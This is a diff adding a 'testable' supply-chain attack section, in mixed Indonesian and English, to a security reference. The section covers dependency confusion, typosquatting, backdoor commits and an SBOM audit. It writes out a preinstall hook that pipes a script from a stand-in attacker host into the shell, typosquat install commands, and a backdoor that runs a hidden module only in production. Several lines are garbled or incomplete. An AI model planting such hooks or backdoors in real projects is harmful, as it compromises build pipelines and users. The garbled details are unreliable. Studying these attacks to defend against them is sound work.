@@ -82,5 +82,61 @@ Persistence: Artifact infected → deploy → production → C2
 - SLSA — https://slsa.dev/
 - Sigstore — https://www.sigstore.dev/
 - CycloneDX — https://cyclonedx.org/
-- SolarWinds (CISA) — https://www.cisa.gov/news-events/cyber-advisories/aa21-077a
+- SolarWinds (CISA) — https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-077a
 - XZ Utils (CVE-2024-3094) — https://nvd.nist.gov/vuln/detail/CVE-2024-3094
+
+## Konkret — Supply Chain Payload (Testable)
+
+### Dependency Confusion (npm/pypi)
+
+```bash
+# 1. Cek package internal perusahaan (tidak publik di npm registry)
+# 2. Publish package sama nama di npm registry (public)
+npm publish --access public
+# 3. Versi lebih tinggi dari internal (semver maior)
+# 4. CI/CD pull preferensi registry public (npm default)
+# 5. Malicious preinstall script jalan di CI
+# package.json:
+"scripts": { "preinstall": "curl https://evil.com/sh | sh" }
+```
+
+### Typosquatting
+
+```bash
+# Legit: "requests" → Typosquat: "reqeusts" / "request"
+# Library with similar name, subtly different:
+- "python-dateutil" → "python-dateutil" (correct)
+- "python-dateutils" → "python-dateutils" (faked, +s)
+- "reqeusts" "requests2" "request"
+# Install:
+pip install reqeusts     # jenis malicious → execute setup.py
+```
+
+### Backdoor commit (Source Code)
+
+```bash
+# 1. Compromise maintainer
+# 2. Inject backdoor di minor commit (tidak terdeteksi review)
+# event-stream (2018): malicious30 commit → copay bitcoin wallet theft
+# is-plain-object (2021):
+
+# 3. Code pattern: janitordraft
+#   const x = require("./malicious")
+#   if (process.env.NODE_ENV === "production") x.run()
+# 4. Malicious payload di sub-module (indirect)
+```
+
+### SBOM Audit
+
+```bash
+# CycloneDX / SPDX generate SBOM
+cyclonedx-py -i requirements.txt -o sbom.json
+syft . -o cyclonedx-json > sbom.json
+# Vulnerability scan
+grype sbom:./sbom.json
+# Output: CVE match, severity, fix version
+```
+---
+
+audited
+---
